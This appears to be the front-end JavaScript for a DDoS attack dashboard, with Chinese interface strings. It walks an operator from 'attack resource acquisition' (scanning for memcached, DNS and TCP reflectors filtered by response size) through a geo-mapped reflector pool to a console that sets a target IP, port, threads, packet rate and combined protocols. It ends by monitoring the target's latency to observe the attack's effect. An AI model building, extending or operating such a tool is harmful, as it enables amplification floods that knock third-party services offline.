let pollingInterval = null;
let selectedProtocols = [];
let isMultiProtocol = false;
let ppsChart = null;
let ppsDataPoints = [];
let latencyChart = null;
let latencyDataPoints = [];
let latencyMonitorInterval = null;
let isMonitoringLatency = false;
let isLatencySamplePending = false;
let baselineLatency = null;
let baselineSamples = [];
let attackStartTimeForLatency = null;
let currentProto = "memcached";
let serverGlobe = null;
let lastGeoPoints = [];
let lastGeoAreas = [];
let serverMapMode = "3d";
let serverMapShapes = null;
let serverMap2dZoomTransform = null;
let isGeoMapLoading = false;
let serverResourceItems = [];
let serverUnresolvedItems = [];
let selectedAreaCode = "";
let selectedIp = "";
let serverListFilterMode = "all";
let currentServerFile = null;
let currentServerSource = "";
let availableServerSourcesByProto = {};
let selectedServerSourcesByProto = {};
let tcpScanPollInterval = null;
let currentTcpRunId = null;
let currentTcpRuns = [];
let currentTcpFile = null;
let currentDnsFile = null;
let currentAttackResourceProto = "tcp";
let currentView = "dashboard";
let lastVisitedWorkflowStep = "resource";
let latestStatusSnapshot = null;
let currentTcpSummary = null;

const WORKFLOW_STEP_ORDER = ["resource", "pool", "console", "latency"];
const VIEW_TO_WORKFLOW_STEP = {
    "attack-resources": "resource",
    servers: "pool",
    console: "console",
    latency: "latency"
};

const MAX_PPS_POINTS = 40;
const MAX_LATENCY_POINTS = 60;
const CHINA_REGION_ADCODE = {
    BJ: "110000",
    TJ: "120000",
    HE: "130000",
    SX: "140000",
    NM: "150000",
    LN: "210000",
    JL: "220000",
    HL: "230000",
    SH: "310000",
    JS: "320000",
    ZJ: "330000",
    AH: "340000",
    FJ: "350000",
    JX: "360000",
    SD: "370000",
    HA: "410000",
    HB: "420000",
    HN: "430000",
    GD: "440000",
    GX: "450000",
    HI: "460000",
    CQ: "500000",
    SC: "510000",
    GZ: "520000",
    YN: "530000",
    XZ: "540000",
    SN: "610000",
    GS: "620000",
    QH: "630000",
    NX: "640000",
    XJ: "650000",
    TW: "710000",
    HK: "810000",
    MO: "820000"
};

const latencyTimeoutBandPlugin = {
    id: "latencyTimeoutBand",
    getBand(chart, index) {
        const dataset = chart.data.datasets?.[0];
        const xScale = chart.scales.x;
        if (!dataset || !xScale) return null;
        const x = xScale.getPixelForValue(index);
        const prevX = index > 0 ? xScale.getPixelForValue(index - 1) : x;
        const nextX = index < dataset.data.length - 1 ? xScale.getPixelForValue(index + 1) : x;
        const spacing = Math.max(Math.abs(nextX - x), Math.abs(x - prevX), 14);
        const bandWidth = Math.max(12, Math.min(34, spacing * 0.72));
        return { x, left: x - bandWidth / 2, right: x + bandWidth / 2, width: bandWidth };
    },
    beforeDatasetsDraw(chart) {
        const dataset = chart.data.datasets?.[0];
        if (!dataset?.data?.length) return;
        const { ctx, chartArea, scales } = chart;
        const xScale = scales.x;
        if (!ctx || !chartArea || !xScale) return;

        dataset.data.forEach((value, index) => {
            if (value !== null) return;
            const band = this.getBand(chart, index);
            if (!band) return;

            ctx.save();
            ctx.fillStyle = "rgba(255, 79, 109, 0.18)";
            ctx.fillRect(band.left, chartArea.top, band.width, chartArea.bottom - chartArea.top);
            ctx.strokeStyle = "rgba(255, 79, 109, 0.78)";
            ctx.setLineDash([4, 4]);
            ctx.beginPath();
            ctx.moveTo(band.x, chartArea.top);
            ctx.lineTo(band.x, chartArea.bottom);
            ctx.stroke();
            ctx.restore();
        });
    },
    afterDatasetsDraw(chart) {
        const dataset = chart.data.datasets?.[0];
        if (!dataset?.data?.length) return;
        const { ctx, scales } = chart;
        const xScale = scales.x;
        const yScale = scales.y;
        if (!ctx || !xScale || !yScale) return;

        dataset.data.forEach((value, index) => {
            if (value !== null) return;
            const band = this.getBand(chart, index);
            if (!band) return;

            const prevIndex = findPreviousNumericIndex(dataset.data, index);
            const nextIndex = findNextNumericIndex(dataset.data, index);

            ctx.save();
            ctx.strokeStyle = dataset.borderColor || "#ffbd5c";
            ctx.lineWidth = dataset.borderWidth || 2;
            ctx.lineCap = "round";
            ctx.lineJoin = "round";

            if (prevIndex !== -1 && prevIndex === index - 1) {
                const startX = xScale.getPixelForValue(prevIndex);
                const y = yScale.getPixelForValue(dataset.data[prevIndex]);
                drawSmoothTimeoutConnector(ctx, startX, y, band.left, y);
            }

            if (nextIndex !== -1 && nextIndex === index + 1) {
                const endX = xScale.getPixelForValue(nextIndex);
                const y = yScale.getPixelForValue(dataset.data[nextIndex]);
                drawSmoothTimeoutConnector(ctx, band.right, y, endX, y);
            }

            ctx.restore();
        });
    }
};

function findPreviousNumericIndex(data, startIndex) {
    for (let index = startIndex - 1; index >= 0; index -= 1) {
        if (typeof data[index] === "number") return index;
        if (data[index] === null) break;
    }
    return -1;
}

function findNextNumericIndex(data, startIndex) {
    for (let index = startIndex + 1; index < data.length; index += 1) {
        if (typeof data[index] === "number") return index;
        if (data[index] === null) break;
    }
    return -1;
}

function drawSmoothTimeoutConnector(ctx, fromX, fromY, toX, toY) {
    const controlOffset = Math.max(8, Math.abs(toX - fromX) * 0.45);
    ctx.beginPath();
    ctx.moveTo(fromX, fromY);
    ctx.bezierCurveTo(fromX + controlOffset, fromY, toX - controlOffset, toY, toX, toY);
    ctx.stroke();
}

document.addEventListener("DOMContentLoaded", () => {
    localizeTcpScanView();
    initParticles();
    initChart();
    initLatencyChart();
    initServerGlobe();
    setupNavigation();
    initProtocolCheckboxes();
    bindControls();
    initAttackResourceView();
    initDnsScanView();
    toggleMultiProtocol();
    loadAllServerCounts();
    loadServerGeoMap();
    initTcpScan();
    pollStatus();
    bindWorkflowActions();
    updateWorkflowIndicators();
    updateSystemInfo();
    updateDetailedSystemInfo();
    setInterval(updateSystemInfo, 3000);
    setInterval(updateDetailedSystemInfo, 2000);
});

function localizeTcpScanView() {
    const log = document.getElementById("tcpPipelineLog");
    if (log && (log.textContent.trim() === "No TCP scan selected." || !log.textContent.trim())) {
        log.textContent = "尚未选择 TCP 资源获取任务。";
    }
}

function initAttackResourceView() {
    document.querySelectorAll(".attack-resource-card").forEach((card) => {
        card.addEventListener("click", () => {
            switchAttackResourceProto(card.dataset.proto || "tcp");
        });
    });
    switchAttackResourceProto(currentAttackResourceProto);
}

function switchAttackResourceProto(proto = "tcp") {
    currentAttackResourceProto = proto;
    document.querySelectorAll(".attack-resource-card").forEach((card) => {
        card.classList.toggle("active", (card.dataset.proto || "") === proto);
    });
    document.querySelectorAll(".attack-resource-panel").forEach((panel) => {
        panel.classList.toggle("active", (panel.dataset.protoPanel || "") === proto);
    });
    if (proto === "tcp") {
        refreshTcpScan();
    }
    if (proto === "dns") {
        refreshDnsScan();
    }
    updateWorkflowIndicators();
}

function bindControls() {
    document.getElementById("multi_protocol")?.addEventListener("change", toggleMultiProtocol);
    document.getElementById("startBtn")?.addEventListener("click", startTest);
    document.getElementById("stopBtn")?.addEventListener("click", stopTest);
    document.getElementById("resetBtn")?.addEventListener("click", resetTest);
    document.getElementById("method")?.addEventListener("change", updateMethodSettings);
    document.getElementById("startLatencyMonitor")?.addEventListener("click", startLatencyMonitoring);
    document.getElementById("stopLatencyMonitor")?.addEventListener("click", stopLatencyMonitoring);
    document.getElementById("refreshGeoMapBtn")?.addEventListener("click", loadServerGeoMap);
    document.getElementById("reloadServerWorkspaceBtn")?.addEventListener("click", refreshServerResources);
    document.getElementById("openServerFileBtn")?.addEventListener("click", openServerFileModal);
    document.getElementById("clearServerSelectionBtn")?.addEventListener("click", clearServerSelection);
    document.querySelectorAll(".map-view-btn").forEach((btn) => {
        btn.addEventListener("click", () => switchServerMapMode(btn.dataset.mapView || "3d"));
    });
    document.getElementById("tcpStartBtn")?.addEventListener("click", startTcpScan);
    document.getElementById("tcpStopBtn")?.addEventListener("click", stopTcpScan);
    document.getElementById("tcpRefreshBtn")?.addEventListener("click", refreshTcpScan);
    document.getElementById("tcpClearRunsBtn")?.addEventListener("click", clearTcpRunRecords);
    document.getElementById("target_ip")?.addEventListener("input", updateWorkflowIndicators);
    document.getElementById("target_port")?.addEventListener("input", updateWorkflowIndicators);
    document.getElementById("duration")?.addEventListener("input", updateWorkflowIndicators);
    document.getElementById("threads")?.addEventListener("input", updateWorkflowIndicators);
    document.getElementById("target_pps")?.addEventListener("input", updateWorkflowIndicators);
    document.getElementById("latencyTargetIp")?.addEventListener("input", updateWorkflowIndicators);
    document.getElementById("latencyPort")?.addEventListener("input", updateWorkflowIndicators);
    document.getElementById("tcpIpFile")?.addEventListener("change", updateWorkflowIndicators);
    document.getElementById("tcpTargetHost")?.addEventListener("input", updateWorkflowIndicators);
    document.getElementById("tcpPktMethod")?.addEventListener("change", updateWorkflowIndicators);

    document.querySelectorAll(".tab-btn").forEach((btn) => {
        btn.addEventListener("click", () => {
            document.querySelectorAll(".tab-btn").forEach((item) => item.classList.remove("active"));
            btn.classList.add("active");
            currentProto = btn.dataset.proto || "memcached";
            resetServerSelectionState();
            loadServerGeoMap();
            updateWorkflowIndicators();
        });
    });
}

function setupNavigation() {
    document.querySelectorAll(".nav-item").forEach((item) => {
        item.addEventListener("click", (event) => {
            event.preventDefault();
            const view = item.dataset.view;
            if (!view) return;
            navigateToView(view);
        });
    });
}

function bindWorkflowActions() {
    document.querySelectorAll("[data-nav-target]").forEach((button) => {
        button.addEventListener("click", () => navigateToView(button.dataset.navTarget || "dashboard"));
    });
    document.getElementById("quickStartConsole")?.addEventListener("click", () => navigateToView("console"));
    document.getElementById("quickResumeFlow")?.addEventListener("click", () => {
        const workflow = getWorkflowState();
        navigateToView(stepToView(workflow.recommendedStep));
    });
}

function navigateToView(view = "dashboard") {
    currentView = view;
    const step = VIEW_TO_WORKFLOW_STEP[view];
    if (step) lastVisitedWorkflowStep = step;
    document.querySelectorAll(".nav-item").forEach((nav) => nav.classList.toggle("active", nav.dataset.view === view));
    document.querySelectorAll(".view-pane").forEach((pane) => pane.classList.remove("active"));
    document.getElementById(`view-${view}`)?.classList.add("active");
    if (view === "servers") {
        loadServerGeoMap();
        resizeServerGlobe();
    }
    if (view === "attack-resources") {
        switchAttackResourceProto(currentAttackResourceProto || "tcp");
    }
    resizeCharts();
    updateWorkflowIndicators();
}

function stepToView(step) {
    return {
        resource: "attack-resources",
        pool: "servers",
        console: "console",
        latency: "latency"
    }[step] || "dashboard";
}

function updateWorkflowIndicators() {
    renderAttackResourceSummary();
    renderServerSummary();
    renderConsoleSummary();
    renderLatencySummary();
    renderWorkflowOverview();
}

function renderWorkflowOverview() {
    const workflow = getWorkflowState();
    const recommendedLabel = getWorkflowStepLabel(workflow.recommendedStep);
    setText("workflowCurrentChip", `当前建议：${recommendedLabel}`);
    setText("workflowCurrentStepTitle", `${recommendedLabel} · ${getWorkflowUiStateLabel(workflow.steps[workflow.recommendedStep]?.uiState)}`);
    setText("workflowCurrentStepText", getWorkflowStepMessage(workflow, workflow.recommendedStep));
    setText("workflowFlowStatus", `推荐下一步：${recommendedLabel}`);

    WORKFLOW_STEP_ORDER.forEach((step) => {
        const state = workflow.steps[step];
        const badge = document.getElementById(`workflowBadge-${step}`);
        if (badge) {
            badge.textContent = getWorkflowUiStateLabel(state.uiState);
            badge.dataset.state = state.uiState;
        }
        const card = document.querySelector(`[data-workflow-card="${step}"]`);
        if (card) {
            card.classList.toggle("is-current", workflow.currentStep === step);
            card.classList.toggle("is-complete", state.uiState === "completed");
            card.classList.toggle("is-optional", state.uiState === "optional");
            card.classList.toggle("is-active", state.uiState === "in_progress");
        }
        document.querySelectorAll(`.workflow-nav-item[data-workflow-step="${step}"]`).forEach((item) => {
            item.classList.toggle("is-current", workflow.currentStep === step);
            item.classList.toggle("is-complete", state.uiState === "completed");
            item.classList.toggle("is-optional", state.uiState === "optional");
            item.classList.toggle("is-active", state.uiState === "in_progress");
        });
    });
}

function getWorkflowState() {
    const hasTcpRecord = currentTcpRuns.length > 0;
    const resourceTotal = getCurrentResourceTotal();
    const configReady = isConsoleConfigReady();
    const hasRunningConfig = Boolean(latestStatusSnapshot?.config?.target_ip);
    const hasLatencySample = latencyDataPoints.some((point) => point.value !== undefined);
    const filterTitle = document.getElementById("serverFilterTitle")?.innerText || "全部资源";

    let resourceState = "not_started";
    if (currentView === "attack-resources" && !hasTcpRecord) {
        resourceState = "in_progress";
    } else if (hasTcpRecord) {
        resourceState = "completed";
    } else if ((configReady || hasRunningConfig || currentView === "console" || currentView === "latency") && resourceTotal > 0) {
        resourceState = "optional";
    }

    let poolState = "not_started";
    if (currentView === "servers" || serverListFilterMode !== "all" || filterTitle !== "全部资源") {
        poolState = "in_progress";
    } else if (resourceTotal > 0) {
        poolState = (configReady || hasRunningConfig) ? "optional" : "completed";
    }

    let consoleState = "not_started";
    if (latestStatusSnapshot?.status === "running") {
        consoleState = "completed";
    } else if (currentView === "console" || configReady) {
        consoleState = "in_progress";
    } else if (hasRunningConfig) {
        consoleState = "completed";
    }

    let latencyState = "not_started";
    if (isMonitoringLatency) {
        latencyState = "in_progress";
    } else if (hasLatencySample) {
        latencyState = "completed";
    } else if ((configReady || hasRunningConfig) && currentView === "console") {
        latencyState = "optional";
    }

    const steps = {
        resource: { uiState: resourceState },
        pool: { uiState: poolState },
        console: { uiState: consoleState },
        latency: { uiState: latencyState }
    };

    const currentStep = VIEW_TO_WORKFLOW_STEP[currentView]
        || WORKFLOW_STEP_ORDER.find((step) => steps[step].uiState === "in_progress")
        || lastVisitedWorkflowStep;
    const recommendedStep = WORKFLOW_STEP_ORDER.find((step) => steps[step].uiState === "in_progress")
        || WORKFLOW_STEP_ORDER.find((step) => steps[step].uiState === "not_started")
        || WORKFLOW_STEP_ORDER.find((step) => steps[step].uiState === "optional")
        || currentStep
        || "resource";

    return { steps, currentStep, recommendedStep };
}

function getWorkflowStepLabel(step) {
    return {
        resource: "攻击资源获取",
        pool: "资源池确认",
        console: "控制台配置与启动",
        latency: "延迟监控与效果观察"
    }[step] || "流程总览";
}

function getWorkflowUiStateLabel(state) {
    return {
        not_started: "未开始",
        in_progress: "进行中",
        completed: "已完成",
        optional: "可跳过"
    }[state] || "未开始";
}

function getWorkflowStepMessage(workflow, step) {
    if (step === "resource") {
        return currentTcpRuns.length
            ? `当前已存在 ${currentTcpRuns.length} 个 TCP 资源任务记录，可以继续查看结果或直接进入资源池 / 控制台。`
            : "先准备资源最适合新手快速上手；如果当前资源池已经可用，也可以直接跳过这一阶段。";
    }
    if (step === "pool") {
        return `当前资源池已识别 ${getCurrentResourceTotal()} 条资源，筛选视图为“${document.getElementById("serverFilterTitle")?.innerText || "全部资源"}”。`;
    }
    if (step === "console") {
        return isConsoleConfigReady()
            ? "控制台参数已具备启动条件，可以直接发起测试。"
            : "这里负责配置目标、时长、线程和协议组合，熟练用户可直接跳入本页快速启动。";
    }
    return isMonitoringLatency
        ? "延迟监控正在采样中，可继续观察基准延迟、最新延迟和变化趋势。"
        : "延迟监控不是必选步骤，但对观察链路扰动和效果变化很有帮助。";
}

function renderAttackResourceSummary() {
    setText("attackResourcesActiveProto", getMethodText(currentAttackResourceProto).toUpperCase());
    setText("attackResourcesTcpStatus", "已接入");
    const latestRun = currentTcpRuns[0];
    const taskText = latestRun ? `${latestRun.run_id} · ${getTcpStatusText(latestRun.status)}` : "暂无任务";
    setText("attackResourcesLastTask", taskText);
    const fileCount = Array.isArray(currentTcpSummary?.files) ? currentTcpSummary.files.length : 0;
    setText("attackResourcesArtifactSummary", fileCount ? `${fileCount} 个输出文件` : "暂无输出");
    setText("workflowSummaryResourceProto", getMethodText(currentAttackResourceProto).toUpperCase());
    setText("workflowSummaryResourceTask", taskText);
}

function renderServerSummary() {
    const total = String(getCurrentResourceTotal());
    const areaCount = document.getElementById("geoAreaCount")?.innerText || "0";
    const filterTitle = document.getElementById("serverFilterTitle")?.innerText || "全部资源";
    setText("serverSummaryProto", getMethodText(currentProto));
    setText("serverSummaryTotal", total);
    setText("serverSummaryGeo", `${areaCount} 个区域`);
    setText("serverSummaryFilter", filterTitle);
    setText("workflowSummaryPoolTotal", total);
    setText("workflowSummaryPoolView", filterTitle);
}

function renderConsoleSummary() {
    const targetIp = document.getElementById("target_ip")?.value.trim() || "";
    const targetPort = document.getElementById("target_port")?.value || "80";
    const targetPps = document.getElementById("target_pps")?.value || "5000";
    const methods = getConsoleMethodSummary();
    setText("consoleSummaryMode", isMultiProtocol ? "多协议" : "单协议");
    setText("consoleSummaryTarget", targetIp ? `${targetIp}:${targetPort}` : "未指定");
    setText("consoleSummaryPps", targetPps);
    setText("consoleSummaryMethods", methods);
    setText("workflowSummaryConsoleTarget", targetIp ? `${targetIp}:${targetPort}` : "未指定");
    setText("workflowSummaryConsoleMode", isMultiProtocol ? "多协议" : "单协议");
}

function renderLatencySummary() {
    const latencyTarget = document.getElementById("latencyTargetIp")?.value.trim()
        || document.getElementById("target_ip")?.value.trim()
        || "未指定";
    const port = document.getElementById("latencyPort")?.value || document.getElementById("target_port")?.value || "80";
    const latest = document.getElementById("latestLatency")?.innerText || "-- ms";
    const baseline = document.getElementById("autoPingBefore")?.innerText || "-- ms";
    const status = isMonitoringLatency ? "监控中" : (latencyDataPoints.length ? "已采样" : "未启动");
    setText("latencySummaryTarget", latencyTarget === "未指定" ? "未指定" : `${latencyTarget}:${port}`);
    setText("latencySummaryStatus", status);
    setText("latencySummaryBaseline", baseline);
    setText("latencySummaryLatest", latest);
    setText("workflowSummaryLatencyState", status);
    setText("workflowSummaryLatencyLatest", latest);
}

function isConsoleConfigReady() {
    const targetIp = document.getElementById("target_ip")?.value.trim() || "";
    const targetPort = Number(document.getElementById("target_port")?.value || 0);
    const duration = Number(document.getElementById("duration")?.value || 0);
    const threads = Number(document.getElementById("threads")?.value || 0);
    const targetPps = Number(document.getElementById("target_pps")?.value || 0);
    const hasMethod = isMultiProtocol
        ? Array.from(document.querySelectorAll("#multiProtocolSection input[type='checkbox']:checked")).length > 0
        : Boolean(document.getElementById("method")?.value);
    return Boolean(targetIp) && targetPort > 0 && duration > 0 && threads > 0 && targetPps > 0 && hasMethod;
}

function getConsoleMethodSummary() {
    if (isMultiProtocol) {
        const methods = Array.from(document.querySelectorAll("#multiProtocolSection input[type='checkbox']:checked"))
            .map((input) => getMethodText(input.value));
        return methods.length ? methods.join(" + ") : "未选择";
    }
    const method = document.getElementById("method")?.value || "";
    return method ? getMethodText(method) : "未选择";
}

function getCurrentResourceTotal() {
    return Number.parseInt(document.getElementById("geoTotalCount")?.innerText || "0", 10) || 0;
}

function getAvailableServerSources(proto = currentProto) {
    return availableServerSourcesByProto[proto] || [];
}

function getSelectedServerSources(proto = currentProto) {
    return selectedServerSourcesByProto[proto] || [];
}

function getDefaultServerSources(proto, sources) {
    if (!sources.length) return [];
    return proto === "tcp"
        ? sources.map((item) => item.name)
        : [sources[0].name];
}

async function fetchServerSourceFiles(proto = currentProto, force = false) {
    if (!force && availableServerSourcesByProto[proto]) return getAvailableServerSources(proto);
    const response = await fetch(`/api/servers/${proto}/files`);
    const data = await response.json();
    if (!data.success) throw new Error(data.message || "资源源文件加载失败");
    const files = Array.isArray(data.files) ? data.files : [];
    availableServerSourcesByProto[proto] = files;
    return files;
}

async function ensureServerSourceSelection(proto = currentProto, forceRefresh = false) {
    const sources = await fetchServerSourceFiles(proto, forceRefresh);
    const selected = getSelectedServerSources(proto);
    const validNames = new Set(sources.map((item) => item.name));
    const filtered = selected.filter((name) => validNames.has(name));
    const nextSelection = filtered.length ? filtered : getDefaultServerSources(proto, sources);
    selectedServerSourcesByProto[proto] = nextSelection;
    return nextSelection;
}

function buildServerGeoQuery(proto = currentProto) {
    const params = new URLSearchParams();
    getSelectedServerSources(proto).forEach((source) => params.append("files", source));
    const query = params.toString();
    return query ? `?${query}` : "";
}

function getSelectedServerSourceSummary(proto = currentProto) {
    const selected = getSelectedServerSources(proto);
    if (!selected.length) return "未选择源文件";
    if (selected.length === 1) return selected[0];
    return `${selected.length} 个源文件`;
}

async function initTcpScan() {
    bindTcpModalControls();
    await loadTcpResources();
    await refreshTcpScan();
}

function bindTcpModalControls() {
    document.getElementById("tcpStopCleanupBtn")?.addEventListener("click", () => stopTcpScan(true));
    document.getElementById("tcpFileModalClose")?.addEventListener("click", closeTcpFileModal);
    document.querySelector('[data-dismiss="tcp-file-modal"]')?.addEventListener("click", closeTcpFileModal);
    document.getElementById("tcpFileSaveBtn")?.addEventListener("click", saveTcpFileContent);
    document.getElementById("tcpFileReloadBtn")?.addEventListener("click", reloadTcpFileContent);
    document.getElementById("serverSourceModalClose")?.addEventListener("click", closeServerSourceModal);
    document.querySelector('[data-dismiss="server-source-modal"]')?.addEventListener("click", closeServerSourceModal);
    document.getElementById("serverSourceApplyBtn")?.addEventListener("click", applyServerSourceSelection);
    document.getElementById("serverFileModalClose")?.addEventListener("click", closeServerFileModal);
    document.querySelector('[data-dismiss="server-file-modal"]')?.addEventListener("click", closeServerFileModal);
    document.getElementById("serverFileSaveBtn")?.addEventListener("click", saveServerFileContent);
    document.getElementById("serverFileReloadBtn")?.addEventListener("click", reloadServerFileContent);
}

async function loadTcpResources() {
    const select = document.getElementById("tcpIpFile");
    if (!select) return;
    try {
        const response = await fetch("/api/tcp-scan/resources");
        const data = await response.json();
        if (!data.success) throw new Error(data.message || "TCP 资源加载失败");
        select.innerHTML = "";
        (data.resources || []).forEach((resource) => {
            const option = document.createElement("option");
            option.value = resource.path || resource.filename;
            option.textContent = `${resource.filename} (${resource.non_empty_lines || 0})`;
            if (resource.filename === "test.txt") option.selected = true;
            select.appendChild(option);
        });
        updateWorkflowIndicators();
    } catch (error) {
        showNotification(`TCP 资源加载失败：${error.message}`, "error");
    }
}

function readTcpScanPayload() {
    const checkedMethods = Array.from(document.querySelectorAll('#tcpMethodChecks input[type="checkbox"]:checked'))
        .map((input) => input.value);
    return {
        ip_file: document.getElementById("tcpIpFile")?.value || "",
        target_host: document.getElementById("tcpTargetHost")?.value.trim() || "",
        pkt_method: document.getElementById("tcpPktMethod")?.value || "PSH",
        pkt_methods: checkedMethods.length ? checkedMethods : undefined,
        scan_rate: readNumber("tcpScanRate", 2500),
        ttl: readNumber("tcpTtl", 255),
        scan_count: readNumber("tcpScanCount", 10),
        result_limit: readNumberAllowZero("tcpResultLimit", 30),
        length_threshold: readNumberAllowZero("tcpLengthThreshold", 2000),
        network_interface: document.getElementById("tcpNetworkInterface")?.value.trim() || "eth0",
        dry_run: Boolean(document.getElementById("tcpDryRun")?.checked)
    };
}

async function startTcpScan() {
    const payload = readTcpScanPayload();
    if (!payload.ip_file || !payload.target_host) {
        showNotification("TCP 扫描需要选择 IP 资源并填写目标主机", "error");
        return;
    }
    const methods = payload.pkt_methods?.length ? payload.pkt_methods : [payload.pkt_method];
    if (!methods.length) {
        showNotification("请至少选择一种报文方法", "error");
        return;
    }
    setTcpControls(true, false);
    try {
        if (!payload.dry_run) {
            for (const method of methods) {
                const report = await runTcpPreflight({ ...payload, pkt_method: method });
                if (!report.ok) {
                    setTcpControls(false, false);
                    return;
                }
            }
        } else {
            setText("tcpPreflightStatus", "当前为模拟运行，将跳过真实扫描预检。");
        }
        const result = await postJson("/api/tcp-scan/runs", payload);
        if (!result.success) throw new Error(result.message || "TCP 扫描启动失败");
        showNotification(`已创建 ${result.run_ids?.length || methods.length} 个 TCP 扫描任务`, "success");
        if (Array.isArray(result.run_ids) && result.run_ids.length) {
            currentTcpRunId = result.run_ids[0];
        }
        startTcpPolling();
        await refreshTcpScan();
    } catch (error) {
        showNotification(`TCP 扫描启动失败：${getTcpApiMessage(error.message, error.message)}`, "error");
        setTcpControls(false, false);
    }
}

async function runTcpPreflight(payload) {
    const params = new URLSearchParams({
        dry_run: String(Boolean(payload.dry_run)),
        pkt_method: payload.pkt_method || "PSH",
        network_interface: payload.network_interface || "eth0"
    });
    const response = await fetch(`/api/tcp-scan/preflight?${params.toString()}`);
    const data = await response.json();
    if (!response.ok || (!data?.success && !data?.report)) {
        const message = data?.message || data?.error || `HTTP ${response.status}`;
        setText("tcpPreflightStatus", `预检请求失败：${message}`);
        showNotification(`预检请求失败：${message}`, "error");
        return { ok: false, checks: [] };
    }
    const checks = data.report?.checks || [];
    const failures = checks
        .filter((item) => !item.ok)
        .map((item) => `${item.label}：${item.message}${item.path ? `：${item.path}` : ""}`);
    const statusText = failures.length
        ? `预检未通过：${failures.join("；")}`
        : "预检通过，可以执行真实扫描。";
    setText("tcpPreflightStatus", statusText);
    if (failures.length) {
        showNotification(statusText, "error");
        return { ok: false, checks };
    }
    return { ok: true, checks };
}

async function stopTcpScan(cleanup = false) {
    if (!currentTcpRunId) {
        showNotification("尚未选择 TCP 扫描任务", "error");
        return;
    }
    try {
        const result = await postJson(`/api/tcp-scan/runs/${currentTcpRunId}/stop`, { cleanup });
        showNotification(
            getTcpApiMessage(result.message, cleanup ? "已请求停止并清理任务" : "已请求停止 TCP 扫描"),
            result.success ? "info" : "error"
        );
        await refreshTcpScan();
    } catch (error) {
        showNotification(`TCP 扫描停止失败：${getTcpApiMessage(error.message, error.message)}`, "error");
    }
}

async function clearTcpRunRecords() {
    if (!confirm("清除所有已结束 TCP 扫描记录及产物？运行中的任务会保留。")) {
        return;
    }
    const clearBtn = document.getElementById("tcpClearRunsBtn");
    if (clearBtn) clearBtn.disabled = true;
    try {
        const response = await fetch("/api/tcp-scan/runs", { method: "DELETE" });
        const data = await readJsonResponse(response);
        if (!response.ok || !data?.success) {
            throw new Error(data?.message || data?.error || `HTTP ${response.status}`);
        }
        if ((data.deleted || []).includes(currentTcpRunId)) {
            currentTcpRunId = null;
        }
        const skippedText = data.skipped?.length ? `，保留 ${data.skipped.length} 个运行中任务` : "";
        showNotification(`${data.message || "记录已清除"}${skippedText}`, "success");
        await refreshTcpScan();
    } catch (error) {
        showNotification(`清除记录失败：${getTcpApiMessage(error.message, error.message)}`, "error");
    } finally {
        if (clearBtn) clearBtn.disabled = false;
    }
}

function startTcpPolling() {
    if (tcpScanPollInterval) clearInterval(tcpScanPollInterval);
    tcpScanPollInterval = setInterval(refreshTcpScan, 1000);
}

async function refreshTcpScan() {
    if (currentAttackResourceProto !== "tcp") return;
    try {
        const response = await fetch("/api/tcp-scan/runs");
        const data = await response.json();
        if (!data.success) throw new Error(data.message || "TCP 扫描记录加载失败");
        currentTcpRuns = data.runs || [];
        renderTcpRunList(currentTcpRuns, data.active_run_ids || []);
        const activeRunIds = data.active_run_ids || [];
        const selected = currentTcpRunId
            ? currentTcpRuns.find((run) => run.run_id === currentTcpRunId)
            : null;
        const preferred = selected
            || (activeRunIds.length ? currentTcpRuns.find((run) => run.run_id === activeRunIds[0]) : null)
            || currentTcpRuns[0];
        if (!preferred) {
            renderTcpEmptyState();
            updateWorkflowIndicators();
            return;
        }
        currentTcpRunId = preferred.run_id;
        await loadTcpRunDetail(preferred.run_id);
        if (!activeRunIds.length && tcpScanPollInterval) {
            clearInterval(tcpScanPollInterval);
            tcpScanPollInterval = null;
        }
        updateWorkflowIndicators();
    } catch (error) {
        console.warn("TCP 扫描刷新失败", error);
    }
}

function renderTcpRunList(runs, activeRunIds) {
    const container = document.getElementById("tcpRunList");
    if (!container) return;
    if (!runs.length) {
        container.innerHTML = `<div class="info-text">暂无 TCP 扫描任务。</div>`;
        return;
    }
    container.innerHTML = runs.map((run) => {
        const isActive = run.run_id === currentTcpRunId;
        const running = activeRunIds.includes(run.run_id);
        const metaText = running ? "执行中" : getTcpStatusText(run.status);
        return `
            <button type="button" class="tcp-run-item ${isActive ? "active" : ""}" data-run-id="${escapeHtml(run.run_id)}">
                <span class="tcp-run-item-main">
                    <span>${escapeHtml(run.run_id)}</span>
                    <span>${escapeHtml(run.target_host || "-")}</span>
                </span>
                <span class="tcp-run-item-meta">
                    <span>${escapeHtml(run.pkt_method || "-")}</span>
                    <strong>${escapeHtml(metaText)}</strong>
                </span>
            </button>
        `;
    }).join("");
    container.querySelectorAll("[data-run-id]").forEach((item) => {
        item.addEventListener("click", async () => {
            currentTcpRunId = item.getAttribute("data-run-id");
            renderTcpRunList(currentTcpRuns, activeRunIds);
            await loadTcpRunDetail(currentTcpRunId);
        });
    });
}

async function loadTcpRunDetail(runId) {
    const response = await fetch(`/api/tcp-scan/runs/${runId}`);
    const data = await response.json();
    if (!data.success) throw new Error(data.message || "TCP 扫描详情加载失败");
    const summary = data.summary || {};
    renderTcpSummary(summary);
    await loadTcpRunLog(runId);
}

async function loadTcpRunLog(runId) {
    const response = await fetch(`/api/tcp-scan/runs/${runId}/logs?tail=160`);
    const data = await response.json();
    if (data.success) {
        const box = document.getElementById("tcpPipelineLog");
        if (box) box.textContent = data.log || "";
    }
}

function renderTcpSummary(summary) {
    currentTcpSummary = summary;
    const status = summary.status || "unknown";
    const config = summary.config || {};
    setText("tcpStatus", getTcpStatusText(status));
    setText("tcpRunId", summary.run_id || "-");
    setText("tcpRunMethod", config.pkt_method || "-");
    setText("tcpRunHost", config.target_host || "-");
    renderTcpMeta(summary);
    renderTcpArtifacts(summary.files || []);
    renderTcpStages(summary.stages || {}, summary.current_stage || null);
    renderTcpRuntimeError(summary);
    setTcpControls(summary.is_running || status === "running" || status === "stopping", Boolean(summary.is_running));
    updateWorkflowIndicators();
}

function renderTcpMeta(summary) {
    const container = document.getElementById("tcpRunMeta");
    if (!container) return;
    const items = [
        ["当前阶段", getTcpStageText(summary.current_stage || "-")],
        ["开始时间", summary.started_at || "-"],
        ["结束时间", summary.ended_at || "-"],
        ["模拟运行", summary.config?.dry_run ? "是" : "否"],
        ["停止请求", summary.stop_requested ? "已请求" : "未请求"],
        ["失败原因", summary.error || summary.runtime_error || "-"]
    ];
    container.innerHTML = items.map(([label, value]) => `
        <div class="tcp-run-meta-item">
            <span>${escapeHtml(label)}</span>
            <strong>${escapeHtml(value)}</strong>
        </div>
    `).join("");
}

function renderTcpArtifacts(files) {
    const container = document.getElementById("tcpArtifacts");
